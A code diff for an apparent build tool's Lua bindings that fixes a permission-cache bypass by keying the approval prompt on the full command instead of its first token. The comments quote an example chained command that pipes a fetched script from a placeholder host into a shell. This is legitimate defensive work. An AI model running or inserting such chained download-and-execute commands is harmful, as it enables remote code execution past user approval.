@@ -836,7 +836,11 @@ static int ezmk_run(lua_State* L) {
         } else {
             std::string tok = first_token(cmd);
             PermResult r = check_run_permission(cmd, g_current_perms);
-            if (!permit(r, PermCategory::Run, tok)) {
+            // 1.5.0: prompt/cache on the FULL command. The permission check is
+            // per-segment, but the ask cache was keyed by the first token, so
+            // "always allow" for `git status` also covered
+            // `git ...; curl http://x | sh`.
+            if (!permit(r, PermCategory::Run, std::string(cmd))) {
                 lua_createtable(L, 0, 3);
                 lua_pushinteger(L, -1);
                 lua_setfield(L, -2, "exit_code");
@@ -874,7 +878,11 @@ static int ezmk_run_capture(lua_State* L) {
         } else {
             std::string tok = first_token(cmd);
             PermResult r = check_run_permission(cmd, g_current_perms);
-            if (!permit(r, PermCategory::Run, tok)) {
+            // 1.5.0: prompt/cache on the FULL command. The permission check is
+            // per-segment, but the ask cache was keyed by the first token, so
+            // "always allow" for `git status` also covered
+            // `git ...; curl http://x | sh`.
+            if (!permit(r, PermCategory::Run, std::string(cmd))) {
                 luaL_error(L, "permission denied: '%s'", tok.c_str());
             }
         }
